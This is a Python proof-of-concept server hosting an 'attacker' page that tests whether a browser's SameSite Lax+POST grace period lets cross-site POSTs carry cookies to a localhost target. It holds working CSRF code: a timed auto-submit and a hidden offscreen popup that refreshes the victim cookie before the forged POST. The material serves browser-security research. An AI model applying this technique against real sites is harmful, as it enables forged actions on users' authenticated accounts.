# ==========================================
# SameSite Lax+POST 2-Minute Grace Period & Cookie-Refresh Hypothesis Tester
# PoC by RivenX173
# ==========================================
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
import traceback

class QuietHTTPServer(HTTPServer):
    def handle_error(self, request, client_address):
        exc_type = sys.exc_info()[0]
        if exc_type in (ConnectionAbortedError, ConnectionResetError, BrokenPipeError):
            return
        traceback.print_exc()

class Handler(BaseHTTPRequestHandler):
    def address_string(self):
        return self.client_address[0]

    def do_GET(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Site A - Attacker</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: #f0f2f5;
                    padding: 40px 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }
                .container {
                    background: white;
                    max-width: 700px;
                    padding: 40px;
                    border-radius: 12px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
                    border: 1px solid #e0e0e0;
                }
                h1 {
                    color: #1a1a1a;
                    font-size: 28px;
                    margin-bottom: 10px;
                }
                .badge {
                    display: inline-block;
                    background: #4B0082;
                    color: white;
                    font-size: 14px;
                    padding: 4px 14px;
                    border-radius: 20px;
                    font-weight: 600;
                    margin-bottom: 20px;
                }
                p {
                    color: #333;
                    font-size: 16px;
                    line-height: 1.6;
                    margin: 12px 0;
                }
                .step {
                    background: #f8f9fa;
                    border-left: 4px solid #4B0082;
                    padding: 10px 16px;
                    margin: 16px 0;
                    border-radius: 0 6px 6px 0;
                    font-size: 15px;
                }
                .step strong {
                    color: #4B0082;
                }
                .test-btn {
                    background-color: #4B0082;
                    color: white;
                    font-size: 20px;
                    padding: 14px 32px;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: bold;
                    margin: 16px 10px 8px 0;
                    transition: background 0.2s;
                }
                .test-btn:hover {
                    background-color: #6A0DAD;
                }
                .visit-btn {
                    background-color: #0056b3;
                }
                .visit-btn:hover {
                    background-color: #004494;
                }
                .mode-btn {
                    background-color: #6c757d;
                    font-size: 18px;
                    width: 100%;
                    margin: 0 0 4px 0;
                }
                .mode-btn:hover {
                    background-color: #5a6268;
                }
                .mode-btn.on {
                    background-color: #2e7d32;
                }
                .mode-btn.on:hover {
                    background-color: #1b5e20;
                }
                .mode-note {
                    font-size: 13px;
                    color: #777;
                    margin: 0 0 16px 0;
                    line-height: 1.5;
                    text-align: center;
                }
                .note {
                    font-size: 14px;
                    color: #777;
                    margin-top: 10px;
                }
                .poc-credit {
                    position: fixed;
                    bottom: 10px;
                    right: 10px;
                    color: #888;
                    font-size: 12px;
                    font-family: sans-serif;
                    background: rgba(255,255,255,0.9);
                    padding: 5px 14px;
                    border-radius: 4px;
                    border: 1px solid #ddd;
                    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
                    user-select: none;
                }
                hr {
                    border: none;
                    border-top: 1px solid #e0e0e0;
                    margin: 20px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <span class="badge">[ Attacker ]</span>
                <h1>Site A</h1>
                <p>This site simulates a <strong>malicious cross-site POST request</strong>.</p>
                <hr>
                <div class="step">
                    <strong>Step 1:</strong> Make sure you have already <strong style="color: #0056b3;">visited Site B (localhost:9000)</strong> to set the cookie.
                </div>
                <div class="step">
                    <strong>Step 2:</strong> Choose your attack method below.
                </div>

                <button id="mode-toggle" class="test-btn mode-btn" onclick="toggleRealMode()">
                    Real World Scenario Mode: OFF
                </button>
                <p class="mode-note">
                    When <strong>ON</strong>, the page behaves like a real-world scenario:<br>
                    - The POST request is sent automatically after 5 seconds (no cookie refresh).<br>
                    - Or, if you click anywhere on the page, a cookie refresh is performed first, then the POST request is sent immediately.<br>
                    The buttons below still work normally when this mode is on, but the automatic behavior may interfere with them.<br>
                    When <strong>OFF</strong>, only the buttons below will trigger the attack, giving you full manual control.
                </p>

                <form action="http://localhost:9000/" method="GET" style="display: inline-block;">
                    <button class="test-btn visit-btn" type="submit">Visit Site B</button>
                </form>

                <form id="csrf-form" action="http://localhost:9000/receive" method="POST" style="display: inline-block;">
                    <button class="test-btn" type="submit">Send Normal Cross-Site POST request</button>
                </form>

                <button class="test-btn" onclick="refreshAndAttack()">Refresh Cookie & Send Cross-Site POST request</button>

                <p class="note">The first button sends a normal cross-site POST request.<br>The second button forces a cookie refresh first, then immediately sends a cross-site POST request.</p>
                <hr>
                <p style="font-size: 14px; color: #555;">
                    <strong>Expected behavior:</strong><br>
                    <span style="color: #2e7d32; font-weight: bold;">[OK] Green result</span> -> Grace period is still active.<br>
                    <span style="color: #c62828; font-weight: bold;">[X] Red result</span> -> Grace period has been removed, OR you forgot to visit Site B first to create the initial cookie.
                </p>
            </div>

            <div class="poc-credit">PoC by RivenX173</div>

            <script>
                let realModeOn = localStorage.getItem('realModeOn') === 'true';
                let autoFired = false;
                let autoTimer = null;

                function applyModeUI() {
                    const btn = document.getElementById('mode-toggle');
                    if (realModeOn) {
                        btn.textContent = 'Real World Scenario Mode: ON';
                        btn.classList.add('on');
                    } else {
                        btn.textContent = 'Real World Scenario Mode: OFF';
                        btn.classList.remove('on');
                    }
                }

                function toggleRealMode() {
                    realModeOn = !realModeOn;
                    localStorage.setItem('realModeOn', realModeOn);
                    applyModeUI();
                    if (realModeOn) {
                        startAutoAttack();
                    } else {
                        clearTimeout(autoTimer);
                        autoFired = false;
                    }
                }

                function startAutoAttack() {
                    autoFired = false;
                    clearTimeout(autoTimer);
                    autoTimer = setTimeout(() => {
                        if (autoFired) return;
                        autoFired = true;
                        document.getElementById('csrf-form').submit();
                    }, 5000);
                }

                function refreshAndAttack() {
                    if (autoFired) return;
                    autoFired = true;
                    clearTimeout(autoTimer);

                    let win = window.open('http://localhost:9000/?refresh=1', 'refreshWin', 'width=100,height=100,left=9999,top=9999');

                    if (!win || win.closed || typeof win.closed === 'undefined') {
                        alert('Popup blocked. Please allow popups for this site, then try again.');
                        autoFired = false;
                        return;
                    }

                    setTimeout(() => {
                        try { win.close(); } catch (e) {}
                        document.getElementById('csrf-form').submit();
                    }, 400);
                }

                document.addEventListener('click', (e) => {
                    if (!realModeOn) return;
                    if (e.target.closest('button') || e.target.closest('a') || e.target.closest('form')) return;
                    refreshAndAttack();
                });

                window.addEventListener('pageshow', (e) => {
                    if (e.persisted) {
                        autoFired = false;
                        clearTimeout(autoTimer);
                        if (realModeOn) {
                            startAutoAttack();
                        }
                    }
                });

                applyModeUI();
                if (realModeOn) {
                    startAutoAttack();
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

print("Server A (Attacker) running on http://127.0.0.1:8000")
print("PoC by RivenX173")
QuietHTTPServer(('127.0.0.1', 8000), Handler).serve_forever()